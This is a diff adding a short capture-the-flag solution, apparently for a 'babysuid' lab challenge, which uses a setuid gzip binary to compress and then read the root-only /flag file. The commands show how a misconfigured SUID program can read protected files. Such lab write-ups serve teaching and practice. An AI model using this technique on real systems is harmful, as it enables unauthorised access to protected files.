@@ -1,0 +1,5 @@
+1 Connect to terminal
+2 Read instruction : /challenge/babysuid
+3 Compress file in readable directory : /challenge/bin/gzip -c /flag > flag.gz
+4 Decompress file : gunzip flag.gz
+5 Read flag : cat flag
